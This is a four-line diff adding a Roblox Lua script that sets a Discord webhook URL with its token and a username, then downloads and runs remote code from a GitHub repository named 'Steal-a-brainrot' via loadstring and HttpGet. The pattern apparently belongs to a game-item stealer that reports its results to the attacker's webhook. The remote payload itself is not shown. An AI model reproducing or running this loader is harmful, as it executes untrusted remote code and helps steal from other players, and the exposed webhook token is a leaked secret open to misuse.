@@ -1,0 +1,4 @@
+_G.Webhook = "https://discordapp.com/api/webhooks/1438681964939841657/JOlaPk0AFZMpvd5YyFwx_iWsXd7e2E9EeCRe2kT4OBnHw4PDEsN8_Gvio1deKfEJTo4E" 
+_G.Username = "criminalsyndrome"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blox-star/Steal-a-brainrot/refs/heads/main/Ultra",true))()
